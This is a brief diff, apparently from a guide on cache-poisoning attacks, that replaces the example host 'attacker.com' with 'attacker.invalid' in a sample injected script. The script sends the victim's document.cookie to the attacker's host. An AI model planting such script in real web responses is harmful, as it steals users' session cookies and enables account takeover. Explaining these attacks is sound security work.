@@ -563,7 +563,7 @@ Content-Length: 100
 
 <script>
   // Malicious JavaScript injected into cached response
-  document.location='http://attacker.com/steal?cookie='+document.cookie;
+  document.location='http://attacker.invalid/steal?cookie='+document.cookie;
 </script>
 ```
 
